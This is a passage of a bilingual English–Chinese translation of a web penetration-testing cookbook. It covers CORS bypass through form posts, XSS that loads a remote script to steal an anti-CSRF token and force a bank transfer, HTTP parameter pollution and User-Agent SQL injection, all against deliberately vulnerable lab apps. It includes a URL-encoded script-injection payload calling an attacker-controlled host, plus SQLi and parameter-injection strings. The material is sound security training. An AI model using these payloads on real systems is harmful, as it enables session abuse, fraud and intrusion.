  zh: '**跨域资源共享**（**CORS**）是一组配置在服务器端的策略，告诉浏览器服务器是否允许来自外部站点的脚本代码生成的请求（跨域请求），以及允许哪些站点，或者是否只接受来自其自身托管的页面生成的请求（同源）。正确配置的
    CORS 策略有助于防止跨站请求伪造（CSRF）攻击，虽然它并不足以完全防止，但可以阻止一些攻击向量。'
- en: In this recipe, we will configure a web service that does not allow cross-origin
    requests and create a page that is able to send a forged request despite this
    request.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将配置一个不允许跨域请求的 Web 服务，并创建一个能够在这种请求下伪造请求的页面。
- en: Getting ready
  id: totrans-104
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: For this recipe, we will use the Damn Vulnerable Web Services. It can be downloaded
    from its GitHub address at [https://github.com/snoopysecurity/dvws](https://github.com/snoopysecurity/dvws).
    Download the latest version and copy it to the OWASP BWA virtual machine (or download
    it straight to it); we will put the code in `/var/www/dvwebservices/`.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个教程，我们将使用“Damn Vulnerable Web Services”。它可以从其 GitHub 地址 [https://github.com/snoopysecurity/dvws](https://github.com/snoopysecurity/dvws)
    下载。下载最新版本并将其复制到 OWASP BWA 虚拟机中（或者直接下载到虚拟机）；我们将把代码放在 `/var/www/dvwebservices/`
    目录下。
- en: This code is a collection of vulnerable web services made with the purpose of
    security testing; we will modify one of them to make it less vulnerable. Open
    the `/var/www/dvwebservices/vulnerabilities/cors/server.php` file with a text
    editor; it may be nano, included by default in the VM: `nano /var/www/dvwebservices/vulnerabilities/cors/server.php`
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 这段代码是一个脆弱的 Web 服务集合，目的是进行安全性测试；我们将修改其中一个服务，使其不那么脆弱。使用文本编辑器打开 `/var/www/dvwebservices/vulnerabilities/cors/server.php`
    文件；可以使用默认包含在虚拟机中的 nano：`nano /var/www/dvwebservices/vulnerabilities/cors/server.php`
- en: 'Look for all the instances where the Access-Control-Allow-Origin header is
    set and comment each of those lines, as shown in the next screenshot:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 查找所有设置了 `Access-Control-Allow-Origin` 头的实例，并将每一行注释掉，具体操作如下一个截图所示：
- en: '![](assets/64724b50-d138-4112-b68d-be11179753bb.png)'
  id: totrans-108
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/64724b50-d138-4112-b68d-be11179753bb.png)'
- en: 'We also need to add a couple lines of code for the correct processing of the
    request parameters; the final code should be as follows:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还需要添加几行代码，以正确处理请求参数；最终代码应该如下所示：
- en: '[PRE4]'
  id: totrans-110
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: How to do it...
  id: totrans-111
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'Once we have the code in the server, we can browse the web service client at
    `http://192.168.56.11/dvwebservices/vulnerabilities/cors/client.php` and start
    our exercise. Remember to have a proxy such as Burp Suite or ZAP recording all
    the requests:'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦代码部署到服务器，我们可以在 `http://192.168.56.11/dvwebservices/vulnerabilities/cors/client.php`
    浏览 Web 服务客户端，并开始我们的练习。记得使用如 Burp Suite 或 ZAP 这样的代理工具记录所有请求：
- en: First, let's take a look at the normal operation, by browsing to `client.php`*.* It
    shows a secret word generated by the server.
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，让我们看一下正常操作，浏览到 `client.php`。它会显示由服务器生成的密钥词。
- en: 'If we go to the proxy, Burp Suite, in this case, we can see that the client
    makes a `POST` request to `server.php`. There are a few things to notice in this
    request, exemplified in the following screenshot:'
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果我们查看代理工具 Burp Suite，在这种情况下，我们可以看到客户端向 `server.php` 发出了 `POST` 请求。此请求中有一些需要注意的事项，以下截图做了示例：
- en: The `Content-Type` header is `application/json`, which means that the body is
    in the JSON format.
  id: totrans-115
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`Content-Type` 头是 `application/json`，这意味着请求体采用 JSON 格式。'
- en: 'The request''s body is not in the standard HTTP request format (`param1=value&param2=value`),
    but as a JSON object definition, as specified by the header:'
  id: totrans-116
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 请求的主体不是标准的 HTTP 请求格式（`param1=value&param2=value`），而是按照头部所规定的 JSON 对象定义。
- en: '![](assets/d94222fe-47f6-40d7-a6cc-9c4532a683c9.png)'
  id: totrans-117
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d94222fe-47f6-40d7-a6cc-9c4532a683c9.png)'
- en: 'Suppose we want to do a CSRF attack over that request. If we want an HTML page
    to make a request in JSON format, we cannot use an HTML form; we need to use JavaScript.
    Create an HTML file, `CORS-json-request.html` in this example, with the following
    code:'
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 假设我们想对该请求进行 CSRF 攻击。如果我们希望 HTML 页面以 JSON 格式发出请求，就不能使用 HTML 表单；我们需要使用 JavaScript。创建一个
    HTML 文件，例如 `CORS-json-request.html`，并使用以下代码：
- en: '[PRE5]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'The preceding code replicates the request made by `client.php`. Open it in
    the browser and click on Submit request. Nothing will happen, and the following
    screenshot shows why:'
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 上述代码复制了 `client.php` 发出的请求。在浏览器中打开它并点击“提交请求”。什么也不会发生，接下来的截图显示了原因：
- en: '![](assets/a9464e57-67c5-457b-9ecf-a666b8ef5c32.png)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a9464e57-67c5-457b-9ecf-a666b8ef5c32.png)'
- en: According to the preceding error, the request is blocked by the browser because
    the server doesn't specify the allowed origins in its Access-Control-Allow-Origin
    header. This happened because we are requesting a resource (`server.php`) from
    an origin external to the server, a local file in our Kali VM.
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 根据前述错误，请求被浏览器阻止，因为服务器没有在其 `Access-Control-Allow-Origin` 头中指定允许的来源。发生这种情况是因为我们正在从服务器外部的来源请求一个资源（`server.php`），该资源是我们
    Kali 虚拟机中的本地文件。
- en: 'The easiest way to work around this restriction is to create an HTML page that
    sends the same parameters in a `POST` request generated by an HTML form, as browsers
    do not check the CORS policy when submitting forms. Create another HTML file,
    `CORS-form-request.html`, with the following content:'
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 绕过这一限制的最简单方法是创建一个 HTML 页面，该页面发送与 HTML 表单生成的 `POST` 请求相同的参数，因为浏览器在提交表单时不会检查 CORS
    策略。创建另一个 HTML 文件，`CORS-form-request.html`，其内容如下：
- en: '[PRE6]'
  id: totrans-124
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: Browsers do not check CORS policy when submitting HTML forms; however, only
    `GET` and `POST` methods can be used in forms, which leaves out other common methods
    implemented in web services, such as `PUT` and `DELETE`.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 浏览器在提交 HTML 表单时不会检查 CORS 策略；然而，表单中只能使用 `GET` 和 `POST` 方法，这就排除了 Web 服务中常见的其他方法，如
    `PUT` 和 `DELETE`。
- en: 'Load CORS-form-request.html in the browser; it should look as follows:'
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在浏览器中加载 `CORS-form-request.html`，它应该如下所示：
- en: '![](assets/bc04b068-f280-4524-8da0-40d78c7e5d5d.png)'
  id: totrans-127
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/bc04b068-f280-4524-8da0-40d78c7e5d5d.png)'
- en: 'Click on Submit form request and take a look at how the server responds with
    a JSON object containing the secret word:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击提交表单请求，并查看服务器如何响应一个包含秘密词的 JSON 对象：
- en: '![](assets/11bc3034-3153-4bd2-81c5-c1be42a2ebca.png)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/11bc3034-3153-4bd2-81c5-c1be42a2ebca.png)'
- en: Check the request in Burp Suite and verify that the `Content-Type` header is
    `application/x-www-form-urlencoded`.
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Burp Suite 中检查请求并验证 `Content-Type` 头是否为 `application/x-www-form-urlencoded`。
- en: How it works...
  id: totrans-131
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: Our test application for this recipe was a web page (`client.php`) that consumed
    the `REST` web service (`server.php`) to retrieve a secret word. We attempted
    to use a web page in our local system to perform a CSRF attack, but it failed
    because the server doesn't define a CORS policy and the browser, by default, denies
    cross-origin requests.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 本示例的测试应用程序是一个 Web 页面（`client.php`），它使用 `REST` Web 服务（`server.php`）来获取一个秘密词。我们尝试使用本地系统中的
    Web 页面执行 CSRF 攻击，但失败了，因为服务器没有定义 CORS 策略，浏览器默认拒绝跨源请求。
- en: We then made an HTML form to send the same parameters as in the JavaScript request,
    but in HTML form format, and it succeeded. It's not uncommon for web services
    to receive information in multiple formats, such as XML, JSON, or HTML forms,
    because they are intended to interface with many different applications; however,
    this openness may expose the web services to attacks, especially when vulnerabilities
    such as CSRF are not properly addressed.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 然后我们创建了一个 HTML 表单，发送与 JavaScript 请求相同的参数，但以 HTML 表单格式发送，并且成功了。Web 服务接收多种格式的信息（如
    XML、JSON 或 HTML 表单格式）并不罕见，因为它们旨在与许多不同的应用程序进行接口；然而，这种开放性可能会使 Web 服务面临攻击，特别是在没有正确处理
    CSRF 等漏洞时。
- en: Using Cross-Site Scripting to bypass CSRF protection and CORS restrictions
  id: totrans-134
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用跨站脚本（Cross-Site Scripting）绕过 CSRF 保护和 CORS 限制
- en: Oftentimes, when we, as penetration testers, describe XSS to our clients or
    to developers, we focus on the defacement and phishing/information theft aspects
    of its impact and overlook the fact that it can be used by the attacker to forge
    requests using the victim's session to perform any action available to the victim
    within the application.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试人员，我们在向客户或开发者描述 XSS 时，通常会关注其篡改和钓鱼/信息窃取的影响，而忽略了 XSS 攻击者可以利用受害者的会话伪造请求，执行受害者在应用程序内可以执行的任何操作这一点。
- en: In this recipe, we will illustrate this situation using an XSS attack to forge
    a request that is protected with an anti-CSRF token.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们将使用 XSS 攻击来伪造一个请求，该请求带有一个防 CSRF token。
- en: How to do it...
  id: totrans-137
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: For this recipe, we will use the bWApp application in bee-box, `http://192.168.56.13/bWapp`
    in this example, and we will set the security level to Medium.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个示例，我们将在 bee-box 中使用 bWApp 应用程序，示例中的 URL 为 `http://192.168.56.13/bWapp`，并将安全级别设置为中等。
- en: Once logged in to bWApp, go to the bug Cross Site Request Forgery (Transfer
    Amount).
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录到 bWApp 后，转到漏洞“跨站请求伪造（转账金额）”。
- en: Enter an account number and amount and click on the Transfer button.
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入一个账户号码和金额，点击转账按钮。
- en: 'Let''s analyze the following request in Burp Suite. All of the parameters are
    sent via a `GET` request; by looking at the `token` parameter included in the
    URL, we can infer that there is a CSRF protection in place:'
  id: totrans-141
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们在 Burp Suite 中分析以下请求。所有参数都是通过 `GET` 请求发送的；通过查看 URL 中包含的 `token` 参数，我们可以推测存在
    CSRF 保护：
- en: '![](assets/940c7100-8d71-43f7-af90-289898415e1f.png)'
  id: totrans-142
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/940c7100-8d71-43f7-af90-289898415e1f.png)'
- en: 'We will try and exploit an XSS and use it to trigger the transfer request.
    For that, we first need to find the place where the token is stored in the client
    side so that we can retrieve it. Go to the response and look for an input tag
    with the name `token`, and take note of the `id` parameter as well. The following
    screenshot shows that it is a hidden parameter of the form:'
  id: totrans-143
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将尝试利用一个 XSS 漏洞，并利用它触发转账请求。为此，我们首先需要找到客户端存储令牌的位置，以便提取它。查看响应并寻找一个名称为`token`的输入标签，并记录下`id`参数。下图显示它是表单中的一个隐藏参数：
- en: '![](assets/323e299d-9517-4cc4-875c-c7724d136ea1.png)'
  id: totrans-144
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/323e299d-9517-4cc4-875c-c7724d136ea1.png)'
- en: 'Next, we will need to prove that there is an exploitable XSS in place, so go
    to the bug **XSS-Reflected (GET)** and try to exploit it. As demonstrated in the
    following screenshot, it is exploitable:'
  id: totrans-145
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要证明存在可利用的XSS漏洞，因此转到漏洞**XSS-反射型（GET）**并尝试利用它。如以下截图所示，它是可利用的：
- en: '![](assets/9c82cd59-4892-468f-a9e4-fcc6fcafca3b.png)'
  id: totrans-146
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9c82cd59-4892-468f-a9e4-fcc6fcafca3b.png)'
- en: 'We will use that XSS vulnerability to include a JavaScript file hosted in a
    server we control, our Kali Linux VM in this exercise. Create a `forcetransfer.js`
    file with the following code in it:'
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将利用这个XSS漏洞加载一个托管在我们控制的服务器上的JavaScript文件，在本次练习中是我们的Kali Linux虚拟机。创建一个名为`forcetransfer.js`的文件，包含以下代码：
- en: '[PRE7]'
  id: totrans-148
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: Start the Apache web server in Kali Linux and move the file to the web root
    (the default is `*/var/www/html*`).
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动Kali Linux中的Apache web服务器，并将文件移动到网站根目录（默认路径为`*/var/www/html*`）。
- en: Now, exploit the XSS setting with the malicious file as source of the script
    tag. While logged in to bWApp, in a new tab, navigate to `http://192.168.56.13/bWAPP/xss_get.php?firstname=test**%3Cscript+src%3Dhttp%3A%2F%2F192.168.56.10%2Fforce-transfer.js%3E%3C%2Fscript%3E**&lastname=asd&form=submit`.
    The XSS payload is in bold.
  id: totrans-150
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，利用XSS设置，将恶意文件作为脚本标签的来源。在登录到bWApp的情况下，打开新标签页，访问`http://192.168.56.13/bWAPP/xss_get.php?firstname=test**%3Cscript+src%3Dhttp%3A%2F%2F192.168.56.10%2Fforce-transfer.js%3E%3C%2Fscript%3E**&lastname=asd&form=submit`。XSS有效载荷部分加粗显示。
- en: 'The script will load and execute successfully. To take a look at what actually
    happened, look at the Burp Suite''s Proxy history shown in the next screenshot:'
  id: totrans-151
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 脚本会成功加载并执行。为了查看实际发生了什么，查看下图所示的Burp Suite代理历史记录：
- en: '![](assets/c19afdd6-e07c-47db-9bc2-9b47b52a9514.png)'
  id: totrans-152
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c19afdd6-e07c-47db-9bc2-9b47b52a9514.png)'
- en: First, the XSS attack is made, then our malicious file `forcetransfer.js` is
    loaded, and this makes the call to `csrf_2.php`, without parameters. This is where
    our scripts gets the anti-CSRF token to use it to send a new request to `csrf_2.php`
    but this time with all the necessary parameters to make a transfer, and this succeeds.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，进行XSS攻击，然后加载我们的恶意文件`forcetransfer.js`，它调用`csrf_2.php`，不带任何参数。这时，我们的脚本获取了反CSRF令牌，用它发送一个新的请求到`csrf_2.php`，这次带上了所有必要的参数来进行转账，成功了。
- en: How it works...
  id: totrans-154
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: For this recipe, we first identified a request that we wanted to exploit but
    was adequately protected with a unique token. We also identified that the same
    domain (or application) is vulnerable to XSS in other pages.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个操作，我们首先识别了一个请求，虽然使用了唯一的令牌进行了有效的保护，但我们仍然希望利用它。我们还发现同一域（或应用）在其他页面存在XSS漏洞。
- en: By exploiting the XSS vulnerability, we were able to include script code hosted
    outside the target domain and use it to first extract the token and then to forge
    a request that included  legitimate anti-CSRF protection.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 通过利用XSS漏洞，我们能够加载托管在目标域外的脚本代码，并首先提取令牌，然后伪造一个包含合法反CSRF保护的请求。
- en: The script code we used works using JavaScript to send a request to the page
    we wanted to exploit. Once the response is received from the server (`if(xmlhttp.readyState==4
    && xmlhttp.status == 200 )`), it is processed and the token is extracted (`var
    token=responseDoc.getElementById('token').value;`). This is why we needed to take
    note of the `id` parameter when we analyzed the original response and detected
    the token. Having extracted the value for the next valid anti-CSRF token, a new
    request is created and sent; this one contains the values the attacker wants for
    `account` and `amount` and the previously extracted token.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用的脚本代码通过JavaScript向我们想要利用的页面发送请求。一旦服务器返回响应（`if(xmlhttp.readyState==4 && xmlhttp.status
    == 200 )`），它会处理响应并提取令牌（`var token=responseDoc.getElementById('token').value;`）。这就是为什么我们在分析原始响应并检测令牌时需要记录下`id`参数。提取到下一个有效反CSRF令牌后，创建并发送一个新请求；这个请求包含攻击者希望设置的`account`和`amount`值以及之前提取的令牌。
- en: Exploiting HTTP parameter pollution
  id: totrans-158
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用HTTP参数污染
- en: An **HTTP parameter pollution** (**HPP**) attacks occurs when an HTTP parameter
    is repeated multiple times in the same request and the server processes in a different
    way each instance, causing an unexpected behavior in the application.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '**HTTP参数污染**（**HPP**）攻击发生在HTTP参数在同一请求中多次重复，且服务器以不同方式处理每个实例，从而导致应用程序出现意外行为。'
- en: In this recipe, we will demonstrate how HPP can be exploited and will explain
    how it can be used to bypass certain security controls.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个教程中，我们将演示如何利用HPP，并解释它如何被用来绕过某些安全控制。
- en: How to do it...
  id: totrans-161
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'For this recipe, we will use bWApp again as it has a very illustrative example
    of HPP:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 对于这个教程，我们将再次使用bWApp，因为它有一个非常具有示范性的HPP示例：
- en: Log in to bWApp in our vulnerable VM and go to HPP (`http://192.168.56.11/bWAPP/hpp-1.php`).
  id: totrans-163
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 登录到我们的易受攻击虚拟机中的bWApp，进入HPP（`http://192.168.56.11/bWAPP/hpp-1.php`）。
- en: Use the normal flow first; there is a form that asks for a name. When a name
    is submitted, it requires the user to vote for a movie, and, in the end, the user's
    vote is displayed.
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 先使用正常流程；有一个表单要求填写名字。提交名字后，它要求用户为一部电影投票，最后显示用户的投票结果。
- en: 'Note that all parameters (`movie`, `name`, and `action`) are in the URL in
    the last step. Let''s add a second movie parameter with a different value at the
    end of the URL, as shown in the following screenshot:'
  id: totrans-165
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 请注意，所有参数（`movie`、`name` 和 `action`）都出现在最后一步的URL中。让我们在URL的末尾添加一个不同值的第二个电影参数，如下图所示：
- en: '![](assets/cc13220b-3937-4c47-9c7e-fb56babb61e7.png)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/cc13220b-3937-4c47-9c7e-fb56babb61e7.png)'
- en: It seems like the server takes only the last value given to a parameter. Also,
    note that the `name` parameter must have been added to the request via scripting,
    since we introduced it only in the first step.
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来服务器只会处理传递给参数的最后一个值。另外，请注意，`name`参数必须通过脚本添加到请求中，因为我们只在第一步中引入了它。
- en: To have a somewhat realistic exploitation vector, we will attempt to force the
    voting to be always for movie number 2, Iron Man, because *Tony Stark wants to
    win every time*.
  id: totrans-168
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了使攻击向量更加逼真，我们将尝试强制投票总是投给电影编号2，《钢铁侠》，因为*托尼·斯塔克每次都想获胜*。
- en: 'Go to step one and introduce the following as a name: `test2&movie=2;` we are
    injecting the movie parameter after the name. After submitting the name, the next
    step should show something like this:'
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 回到第一步，并将以下内容作为名字引入：`test2&movie=2;` 我们在名字后面注入了电影参数。提交名字后，下一步应该会显示如下内容：
- en: '![](assets/67747942-da5b-4b02-bcfc-00540c9f0ef1.png)'
  id: totrans-170
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/67747942-da5b-4b02-bcfc-00540c9f0ef1.png)'
- en: Vote for any movie but Iron Man. As shown in the following screenshot, the result
    will show you actually voted for Iron Man.
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 投票给任何电影，但不要投给《钢铁侠》。如下面的截图所示，结果会显示你实际上投票给了《钢铁侠》。
- en: '![](assets/b57fb779-a8e5-478a-9d31-fb56c9745c69.png)'
  id: totrans-172
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b57fb779-a8e5-478a-9d31-fb56c9745c69.png)'
- en: How it works...
  id: totrans-173
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: 'In this recipe, we saw how having multiple instances of the same parameter
    in one single request can affect the way the application processes it. The way
    this situation is handled depends on the web server processing the request; here
    are some examples:'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个教程中，我们看到在单一请求中拥有多个相同的参数实例如何影响应用程序处理它的方式。此情况的处理方式取决于处理请求的Web服务器；以下是一些示例：
- en: '**Apache/PHP**: Takes only the last occurrence'
  id: totrans-175
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Apache/PHP**：只处理最后一个出现的值'
- en: '**IBM HTTP Server/JSP**: Takes the first occurrence'
  id: totrans-176
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**IBM HTTP Server/JSP**：只处理第一个出现的值'
- en: '**IIS/ASP.NET**: All values are concatenated, separated by commas'
  id: totrans-177
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**IIS/ASP.NET**：所有值都会被连接起来，用逗号分隔'
- en: This lack of a standardized behavior can be used in specific situations to bypass
    protection mechanisms such as **Web Application Firewalls** (**WAF**) or **Intrusion
    Detection Systems** (**IDS**). Imagine an enterprise scenario that is not rare,
    a Tomcat-based application running on an IBM server being protected by an Apache-based
    WAF; if we send a malicious request with multiple instances of a vulnerable parameter
    and put an injection string in the first occurrence and a valid value in the last
    one, the WAF will take the request as valid, while the web server will process
    the first value, which is a malicious injection.
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 这种缺乏标准化的行为可以在特定情况下被用来绕过保护机制，如**Web应用防火墙**（**WAF**）或**入侵检测系统**（**IDS**）。想象一下一个并不罕见的企业场景，一个基于Tomcat的应用程序运行在IBM服务器上，并受到基于Apache的WAF的保护；如果我们发送一个包含多个易受攻击参数实例的恶意请求，并在第一个实例中放入注入字符串，在最后一个实例中放入有效值，WAF会认为请求是有效的，而Web服务器将处理第一个值，这是一个恶意注入。
- en: HPP may also allow the bypassing of some controls within the application in
    situations where the different instances are sent in different parts of the request,
    such as URL and headers or body, and, due to bad programming practices, different
    methods in the application take the parameter's value either from the whole request
    or from specific parts of it. For example, in PHP, we can get a parameter from
    any part of the request (URL, body, or cookie), without knowing which one uses
    the `$_REQUEST[]` array, or we can get the same from the arrays dedicated to the
    URL or the body `$_GET[]` and `$_POST[]`, respectively. So, if `$_REQUEST[]` is
    used to look for a value that is supposed to be sent via a `POST` request, but
    that parameter is polluted in the URL, the result may include the parameter in
    the URL instead of the one actually wanted.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: HPP 还可能允许在某些情况下绕过应用程序中的一些控制，当不同的实例被发送到请求的不同部分，如 URL、头部或主体，并且由于糟糕的编程实践，应用程序中的不同方法可能从整个请求或其特定部分获取参数的值。例如，在
    PHP 中，我们可以从请求的任何部分（URL、主体或 cookie）获取参数，而不需要知道哪个部分使用了 `$_REQUEST[]` 数组，或者可以分别从专门处理
    URL 或主体的数组 `$_GET[]` 和 `$_POST[]` 获取相同的值。所以，如果 `$_REQUEST[]` 被用来查找一个应该通过 `POST`
    请求发送的值，但该参数在 URL 中被污染，结果可能会包含 URL 中的参数，而不是实际需要的参数。
- en: For more information on this vulnerability and some illustrative examples, visit
    the OWASP page dedicated to it at, [https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)).
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 有关此漏洞的更多信息和一些示例，请访问专门介绍该漏洞的 OWASP 页面，[https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)](https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004))。
- en: Exploiting vulnerabilities through HTTP headers
  id: totrans-181
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过 HTTP 头部利用漏洞
- en: When it comes to input validation and sanitization, some developers focus on
    URL and body parameters, overlooking the fact that the whole request can be manipulated
    in the client side and allow for malicious payload to be included in cookies and
    header values.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 当涉及到输入验证和清理时，一些开发人员关注 URL 和主体参数，却忽略了整个请求可以在客户端被篡改，允许恶意有效负载被包含在 cookies 和头部值中。
- en: In this recipe, we will identify and exploit a vulnerability in a header whose
    value is reflected in the response.
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我们将识别并利用一个漏洞，该漏洞发生在一个在响应中反射的头部值。
- en: How to do it...
  id: totrans-184
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'We now came back to Mutillidae. This time, we will use the OWASP 2013 | A1
    - Injection (SQL) | Bypass Authentication | Login exercise:'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在回到 Mutillidae。这次，我们将使用 OWASP 2013 | A1 - 注入（SQL）| 绕过认证 | 登录练习：
- en: First, send a request with any non-existent user and password so the login fails
  id: totrans-186
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，发送一个包含任何不存在的用户名和密码的请求，以便登录失败。
- en: Send the request to Burp Suite's Repeater and submit it so we can have a reference
    response.
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将请求发送到 Burp Suite 的 Repeater，并提交以便我们可以获取参考响应。
- en: Once in Repeater, we will test SQL Injection vector in the User-Agent header
    and append `'+and+'1'='` to the header's value.
  id: totrans-188
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 进入 Repeater 后，我们将在 User-Agent 头部测试 SQL 注入向量，并在头部值后添加 `'+and+'1'='`。
- en: 'If we compare the responses of both requests, we will see that the one with
    the injection is a few bytes bigger than the original one, as shown in the following
    screenshot:'
  id: totrans-189
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果我们比较两个请求的响应，会发现包含注入的那个比原始响应大了几个字节，如下截图所示：
- en: '![](assets/b56403f8-237f-4ffd-a157-bcb789f4d7f8.png)'
  id: totrans-190
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b56403f8-237f-4ffd-a157-bcb789f4d7f8.png)'
- en: 'To ease the process of discovering exactly what changed between the two responses,
    send them both to Burp Suite''s **Comparer** (right-click on the response and
    select Send to Comparer from the menu), go to the **Comparer** tab, and you will
    see something like this:'
  id: totrans-191
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了简化发现两次响应之间到底发生了什么变化的过程，可以将它们都发送到 Burp Suite 的 **Comparer**（右键点击响应并从菜单中选择“发送到
    Comparer”），然后进入 **Comparer** 标签，你将看到类似这样的内容：
- en: '![](assets/999344ff-37dc-4925-852e-f6493021a9ed.png)'
  id: totrans-192
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/999344ff-37dc-4925-852e-f6493021a9ed.png)'
- en: Click on **Words**, as we want to compare the text, looking for those words
    that changed in it.
  id: totrans-193
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击 **Words**，因为我们要比较文本，找出其中变化的单词。
- en: In the comparison dialog, select the Sync views checkbox in the lower-right
    corner and look for a highlighted difference. Some pretty obvious things, such
    as the server's date, are going to be different. We are looking for something
    that has to do with the payload we injected. The next screenshot shows a relevant
    difference.
  id: totrans-194
  prefs:
  - PREF_OL
